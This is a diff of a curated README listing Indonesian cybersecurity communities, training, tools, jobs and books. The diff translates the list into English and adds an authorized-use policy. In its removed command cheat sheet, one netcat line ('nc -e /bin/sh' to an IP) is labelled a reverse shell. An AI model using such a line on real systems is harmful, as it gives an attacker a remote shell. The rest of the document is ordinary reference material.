@@ -1,240 +1,162 @@
 # Awesome Indonesian Cybersecurity
 
-Kurasi sumber daya cybersecurity untuk profesional, pelajar, dan enthusiast Indonesia.
+A community-maintained index of cybersecurity resources relevant to learners
+and practitioners in Indonesia. The catalog is written in international
+English so it remains useful to a global audience.
 
-## Daftar Isi
+## Curation policy
 
-- [Komunitas](#komunitas)
-- [Training & Sertifikasi](#training--sertifikasi)
-- [Tools Buatan Indonesia](#tools-buatan-indonesia)
-- [CTF & Kompetisi](#ctf--kompetisi)
-- [Blog & Media](#blog--media)
-- [Lowongan Kerja](#lowongan-kerja)
-- [Buku & Referensi](#buku--referensi)
-- [Tools Analisis & Forensik](#tools-analisis--forensik)
-- [Command References](#command-references)
-- [Channel YouTube](#channel-youtube)
-- [Kelas Online Gratis](#kelas-online-gratis)
+- A listing is not an endorsement or a claim of certification quality.
+- Training prices and exam requirements are intentionally omitted because they
+  change frequently; verify them on the provider's official site.
+- Use security tools only on systems you own or have explicit permission to
+  test.
+- Pull requests should prefer an official HTTPS page and explain the resource's
+  relevance to Indonesia.
 
----
+## Contents
 
-## Komunitas
+- [National and community organizations](#national-and-community-organizations)
+- [Learning platforms](#learning-platforms)
+- [Certifications](#certifications)
+- [Indonesian projects](#indonesian-projects)
+- [Competitions](#competitions)
+- [News and research](#news-and-research)
+- [Analysis and forensics tools](#analysis-and-forensics-tools)
+- [Jobs](#jobs)
+- [Books](#books)
+- [Video channels](#video-channels)
 
-| Komunitas | Platform | Deskripsi |
-|-----------|----------|-----------|
-| [ID-CERT](https://www.cert.or.id) | Web | Computer Security Incident Response Team Indonesia |
-| [Indonesia Hacker](https://www.facebook.com/groups/indonesiahacker) | Facebook Grup | Komunitas hacker Indonesia terbesar |
-| [Cyber Security Indonesia](https://www.facebook.com/groups/cybersecindonesia) | Facebook Grup | Diskusi keamanan siber Indonesia |
-| [Komunitas Cyber Security Indonesia](https://t.me/cybersecindonesia) | Telegram | Grup Telegram cyber security |
-| [Linux Indonesia](https://t.me/linux_id) | Telegram | Diskusi Linux dan security |
-| [DevOps Indonesia](https://t.me/devops_indonesia) | Telegram | Infrastruktur dan keamanan cloud |
-| [MikroTik Indonesia](https://www.facebook.com/groups/mikrotikindonesia) | Facebook Grup | Konfigurasi dan hardening MikroTik |
-| [Defacer.ID](https://defacer.id) | Web | Archive deface dan security news |
+## National and community organizations
 
-## Training & Sertifikasi
+| Resource | Type | Focus |
+|---|---|---|
+| [BSSN](https://bssn.go.id) | Government | Indonesia's national cyber and cryptography agency |
+| [ID-CERT](https://www.cert.or.id) | Incident response | Coordination and public incident-response resources |
+| [OWASP Indonesia](https://owasp.org/www-chapter-indonesia/) | Community | Application security chapter |
+| [CSIRT PENS](https://csirt.pens.ac.id) | Academic CSIRT | Incident response and educational material |
+| [Indonesia Hacker](https://www.facebook.com/groups/indonesiahacker) | Community | General security discussion |
+| [Cyber Security Indonesia](https://www.facebook.com/groups/cybersecindonesia) | Community | Indonesian cybersecurity discussion |
+| [Cyber Security Indonesia](https://t.me/cybersecindonesia) | Community | Telegram discussion group |
+| [Linux Indonesia](https://t.me/linux_id) | Community | Linux administration and security |
+| [DevOps Indonesia](https://t.me/devops_indonesia) | Community | Infrastructure, operations, and cloud security |
+| [MikroTik Indonesia](https://www.facebook.com/groups/mikrotikindonesia) | Community | RouterOS operations and security |
 
-### Sertifikasi Global
+Community links can change ownership or moderation policy. Review them before
+sharing personal information.
 
-| Sertifikasi | Level | Biaya | Catatan |
-|-------------|-------|-------|---------|
-| CompTIA Security+ | Entry | $400 | Foundation cybersecurity |
-| CEH (Certified Ethical Hacker) | Intermediate | $1,200 | EC-Council, populer di Indo |
-| OSCP (Offensive Security) | Advanced | $1,600 | Hands-on penetration testing |
-| CISSP | Advanced | $750 | Manajemen keamanan |
-| CCNA | Entry | $300 | Dasar networking, prerequisite security |
-| AWS Security | Intermediate | $150 | Cloud security |
+## Learning platforms
 
-### Sertifikasi Lokal
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
+- [TryHackMe](https://tryhackme.com)
+- [Hack The Box](https://www.hackthebox.com)
+- [picoCTF](https://picoctf.org)
+- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
+- [PentesterLab](https://pentesterlab.com)
+- [OverTheWire](https://overthewire.org)
+- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
 
-| Sertifikasi | Provider | Biaya |
-|-------------|----------|-------|
-| CCEP | Red Team Leaders | ~Rp 500K |
-| CRTOM | Red Team Leaders | ~Rp 500K |
-| BNSP IT Security | BNSP | ~Rp 3-5 Juta |
+## Certifications
 
-### Platform Training Gratis
+Verify current prerequisites, objectives, delivery regions, and fees on the
+official provider page.
 
-- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Web security lab gratis
-- [TryHackMe](https://tryhackme.com) - Hands-on cybersecurity (free tier)
-- [HackTheBox](https://www.hackthebox.com) - CTF-style labs
-- [PicoCTF](https://picoctf.com) - CTF untuk pemula
-- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Web security training
-- [PentesterLab](https://pentesterlab.com) - Web exploitation exercises
-- [OverTheWire](https://overthewire.org) - WarGames untuk Linux security
+- [CompTIA Security+](https://www.comptia.org/certifications/security)
+- [Cisco CCNA](https://www.cisco.com/site/us/en/learn/training-certifications/certifications/enterprise/ccna/index.html)
+- [OffSec OSCP](https://www.offsec.com/courses/pen-200/)
+- [ISC2 CISSP](https://www.isc2.org/certifications/cissp)
+- [AWS Certified Security - Specialty](https://aws.amazon.com/certification/certified-security-specialty/)
+- [BNSP](https://bnsp.go.id)
 
-## Tools Buatan Indonesia
+## Indonesian projects
 
-| Tool | Author | Deskripsi |
-|------|--------|-----------|
-| [kage](https://github.com/vtino17/kage) | vtino17 | AI-powered security scanner |
-| [tools](https://github.com/vtino17/tools) | vtino17 | 85+ pentest tools collection |
-| [taskcapsule](https://github.com/vtino17/taskcapsule) | vtino17 | Task context manager |
-| [mikrotik-hardening](https://github.com/vtino17/mikrotik-hardening) | vtino17 | RouterOS security configs |
-| [wazuh-custom-decoders](https://github.com/vtino17/wazuh-custom-decoders) | vtino17 | Custom Wazuh SIEM rules |
-| [vuln-scanner](https://github.com/vtino17/vuln-scanner) | vtino17 | Vulnerability scanner |
-| [pcap-forensics](https://github.com/vtino17/pcap-forensics) | vtino17 | PCAP forensic analysis |
-| [pysecnet](https://github.com/vtino17/pysecnet) | vtino17 | Python network library |
-| [cyberlab](https://github.com/vtino17/cyberlab) | vtino17 | One-click lab deployer |
-| [incident-response-playbooks](https://github.com/vtino17/incident-response-playbooks) | vtino17 | IR playbooks dan forensics |
-| [network-automation-toolkit](https://github.com/vtino17/network-automation-toolkit) | vtino17 | Multi-vendor network automation |
-| [deep-mind-skill](https://github.com/vtino17/deep-mind-skill) | vtino17 | AI critical thinking skill |
-| [pantau](https://github.com/vtino17/pantau) | vtino17 | CLI link security inspector with Indonesian scam pattern detection |
+| Project | Purpose |
+|---|---|
+| [kage](https://github.com/vtino17/kage) | Security scanning project |
+| [taskcapsule](https://github.com/vtino17/taskcapsule) | Task-context management |
+| [mikrotik-hardening](https://github.com/vtino17/mikrotik-hardening) | RouterOS hardening guidance |
+| [wazuh-custom-decoders](https://github.com/vtino17/wazuh-custom-decoders) | Custom Wazuh decoder and rules |
+| [pcap-forensics](https://github.com/vtino17/pcap-forensics) | PCAP forensic analysis |
+| [pysecnet](https://github.com/vtino17/pysecnet) | Python networking utilities |
+| [cyberlab](https://github.com/vtino17/cyberlab) | Security lab deployment |
+| [incident-response-playbooks](https://github.com/vtino17/incident-response-playbooks) | Incident-response playbooks and collectors |
+| [network-automation-toolkit](https://github.com/vtino17/network-automation-toolkit) | Multi-vendor network automation |
+| [deep-mind-skill](https://github.com/vtino17/deep-mind-skill) | Critical-reasoning skill package |
+| [pantau](https://github.com/vtino17/pantau) | Link inspection with Indonesian scam-pattern coverage |
 
-## CTF & Kompetisi
+Project maturity varies. Review each repository's documentation, tests, open
+issues, and release history before operational use.
 
-### CTF Platform
+## Competitions
 
-- [CTFtime](https://ctftime.org) - Jadwal CTF global
-- [HackTheBox CTF](https://ctf.hackthebox.com) - CTF bulanan
-- [CTF.ID](https://ctf.id) - CTF Indonesia
+- [CTFtime](https://ctftime.org) - international event calendar and rankings
+- [Hack The Box CTF](https://ctf.hackthebox.com) - hosted competitions
+- [GEMASTIK](https://gemastik.kemdikbud.go.id) - Indonesian student competition
+- [COMPFEST](https://compfest.id) - Universitas Indonesia technology event
 
-### Kompetisi Tahunan
+## News and research
 
-| Event | Penyelenggara | Tingkat |
-|-------|---------------|---------|
-| Gemastik | Kemendikbud | Nasional |
-| IndoSec | ID-SIRTII | Nasional |
-| Compfest | Universitas Indonesia | Nasional |
-| Techcomfest | Kemendikbud | Nasional |
-| FCC (Fostering Cyber Talent) | BSSN | Nasional |
-
-## Blog & Media
-
-- [OWASP Indonesia](https://owasp.org/www-chapter-indonesia/)
-- [ID-SIRTII](https://idsirtii.or.id)
 - [BSSN](https://bssn.go.id)
-- [PUSAD (CSIRT PENS)](https://csirt.pens.ac.id)
-- [Portal Satu Data Keamanan Siber](https://cloud.kemkominfo.go.id) - Platform data keamanan siber nasional Kemkomdigi
-- [Medium - Cyber Security Indonesia](https://medium.com/tag/cyber-security-indonesia)
+- [ID-CERT](https://www.cert.or.id)
+- [OWASP Indonesia](https://owasp.org/www-chapter-indonesia/)
+- [Medium: Cybersecurity](https://medium.com/tag/cybersecurity)
 
-## Tools Analisis & Forensik
+## Analysis and forensics tools
 
-| Tool | Deskripsi |
-|------|-----------|
-| [Wireshark](https://wireshark.org) | Network packet analyzer |
-| [Burp Suite](https://portswigger.net/burp) | Web security testing |
-| [Nmap](https://nmap.org) | Network scanner |
-| [Metasploit](https://metasploit.com) | Exploitation framework |
-| [Wazuh](https://wazuh.com) | SIEM and XDR |
-| [Velociraptor](https://github.com/Velocidex/velociraptor) | Endpoint visibility |
-| [TheHive](https://thehive-project.org) | Incident response platform |
-| [MISP](https://misp-project.org) | Threat intelligence platform |
-| [YARA](https://virustotal.github.io/yara/) | Malware pattern matching |
+| Tool | Purpose |
+|---|---|
+| [Wireshark](https://www.wireshark.org) | Packet analysis |
+| [Burp Suite](https://portswigger.net/burp) | Authorized web-security testing |
+| [Nmap](https://nmap.org) | Network discovery and service enumeration |
+| [Wazuh](https://wazuh.com) | SIEM and endpoint security monitoring |
+| [Velociraptor](https://github.com/Velocidex/velociraptor) | Endpoint visibility and collection |
+| [TheHive](https://thehive-project.org) | Incident-response case management |
+| [MISP](https://www.misp-project.org) | Threat-intelligence sharing |
+| [YARA](https://virustotal.github.io/yara/) | Pattern-based file classification |
 | [Volatility](https://volatilityfoundation.org) | Memory forensics |
-| [Autopsy](https://sleuthkit.org/autopsy/) | Disk forensics |
-| [Zeek](https://zeek.org) | Network monitoring |
-| [Suricata](https://suricata.io) | IDS/IPS engine |
-| [Cuckoo Sandbox](https://cuckoosandbox.org) | Malware analysis |
-| [Grafana](https://grafana.com) | Monitoring dashboards |
-| [Prometheus](https://prometheus.io) | Metrics collection |
+| [Autopsy](https://www.autopsy.com) | Disk forensics |
+| [Zeek](https://zeek.org) | Network security monitoring |
+| [Suricata](https://suricata.io) | Network IDS/IPS |
 
-## Lowongan Kerja
+## Jobs
 
-- [Glints](https://glints.com) - Filter "Cyber Security", "IT Security"
-- [LinkedIn](https://linkedin.com) - Filter lokasi Indonesia
-- [Jobstreet](https://jobstreet.co.id)
-- [Karir.com](https://karir.com)
-- [Tech in Asia Jobs](https://techinasia.com/jobs)
+- [LinkedIn Jobs](https://www.linkedin.com/jobs/)
+- [Glints Indonesia](https://glints.com/id)
+- [JobStreet Indonesia](https://id.jobstreet.com)
+- [Tech in Asia Jobs](https://www.techinasia.com/jobs)
 
-## Buku & Referensi
+Search terms such as `SOC analyst`, `security engineer`, `network security`,
+and `incident response` are often more useful than a single broad filter.
 
-### Bahasa Indonesia
+## Books
 
-- [Kuliah Gratis Cyber Security](https://www.coursera.org/professional-certificates/google-cybersecurity) - Google Cybersecurity (EN)
-- [Materi Cyber Security PENS](https://csirt.pens.ac.id)
-- [E-Book CEH Bahasa Indonesia](https://www.google.com/search?q=ceh+ebook+bahasa+indonesia)
+- *The Practice of Network Security Monitoring* by Richard Bejtlich
+- *Blue Team Handbook: Incident Response Edition* by Don Murdoch
+- *The Tangled Web* by Michal Zalewski
+- *Practical Malware Analysis* by Michael Sikorski and Andrew Honig
+- *Security Engineering* by Ross Anderson
 
-### Bahasa Inggris (Rekomendasi)
+Use publisher, author, library, or authorized retailer links. Do not submit
+unauthorized copies.
 
-- The Web Application Hacker's Handbook
-- The Practice of Network Security Monitoring
-- Red Team Field Manual
-- Blue Team Handbook
-- Metasploit: The Penetration Tester's Guide
+## Video channels
 
-## Channel YouTube
+### Indonesian-language channels
 
-### Bahasa Indonesia
+- [Onesinus Tambunan](https://www.youtube.com/@onesinustambunan) - networking and MikroTik
+- [ID-Networkers](https://www.youtube.com/@id-networkers) - network engineering
+- [Kelas Network](https://www.youtube.com/@kelasnetwork) - networking fundamentals
 
-| Channel | Fokus |
-|---------|-------|
-| [Onesinus Tambunan](https://youtube.com/@onesinustambunan) | Networking, MikroTik |
-| [ID-Networkers](https://youtube.com/@id-networkers) | Network engineer |
-| [Kelas Network](https://youtube.com/@kelasnetwork) | Dasar jaringan |
-| [Cyber Security Indonesia](https://youtube.com/@cybersecurityindonesia) | Security umum |
+### English-language channels
 
-### Bahasa Inggris
+- [John Hammond](https://www.youtube.com/@_JohnHammond) - malware analysis and CTFs
+- [IppSec](https://www.youtube.com/@ippsec) - lab walkthroughs
+- [LiveOverflow](https://www.youtube.com/@LiveOverflow) - vulnerability research
+- [STÖK](https://www.youtube.com/@STOKfredrik) - bug bounty methodology
 
-| Channel | Fokus |
-|---------|-------|
-| [John Hammond](https://youtube.com/@johnhammond) | Malware, CTF |
-| [IppSec](https://youtube.com/@ippsec) | HTB walkthrough |
-| [NetworkChuck](https://youtube.com/@networkchuck) | Networking, security |
-| [LiveOverflow](https://youtube.com/@liveoverflow) | Exploit development |
-| [STÖK](https://youtube.com/@stokfredrik) | Bug bounty |
+## Contributing
 
-## Command References
+See [CONTRIBUTING.md](CONTRIBUTING.md). Include the resource name, official URL,
+category, Indonesian relevance, and a neutral one-sentence description.
 
-### Nmap
-
-```bash
-nmap -sV -sC -O target              # Service + OS detection
-nmap -p- target                      # All ports scan
-nmap --script vuln target            # Vulnerability scan
-nmap -sU target                      # UDP scan
-nmap -sn 10.0.0.0/24                # Ping sweep
-```
-
-### Netcat
-
-```bash
-nc -lvnp 4444                        # Listen on port
-nc -vn 10.0.0.1 22                   # Connect to port
-nc -e /bin/sh 10.0.0.1 4444         # Reverse shell
-```
-
-### tcpdump
-
-```bash
-tcpdump -i eth0                      # Capture interface
-tcpdump -i eth0 port 80              # HTTP traffic
-tcpdump -i eth0 host 10.0.0.1       # Host traffic
-tcpdump -w capture.pcap              # Write to file
-```
-
-### Linux Security
-
-```bash
-sudo ss -tlnp                        # Listening ports
-sudo netstat -tulpn                  # Connection status
-sudo iptables -L -n                  # Firewall rules
-sudo journalctl -xe                  # System logs
-sudo fail2ban-client status          # Brute force status
-sudo rkhunter --check               # Rootkit scan
-```
-
-### Windows Security
-
-```powershell
-Get-EventLog -LogName Security -Newest 100
-Get-Process | Where-Object {$_.Path -like "*temp*"}
-netstat -ano | findstr LISTEN
-wevtutil qe Security /c:10 /rd:true /e:true
-```
-
-## Kelas Online Gratis
-
-| Platform | Course | Durasi |
-|----------|--------|--------|
-| [Coursera](https://coursera.org) | Google Cybersecurity | 6 bulan |
-| [Cybrary](https://cybrary.it) | CompTIA Security+ | Self-paced |
-| [PicoCTF](https://picoctf.com) | Learn CTF | Self-paced |
-| [OWASP](https://owasp.org) | Web Security Testing Guide | Self-paced |
-| [TryHackMe](https://tryhackme.com) | Complete Beginner | 20 jam |
-| [PortSwigger](https://portswigger.net) | Web Security Academy | Self-paced |
-
----
-
-**Maintained by [Valentino Saputra](https://github.com/vtino17)** — contributions welcome via PR. To add a resource, open a pull request or suggest via issues.
-
-*Terakhir diperbarui: Juli 2026*
+Maintained by [Valentino Saputra](https://github.com/vtino17).
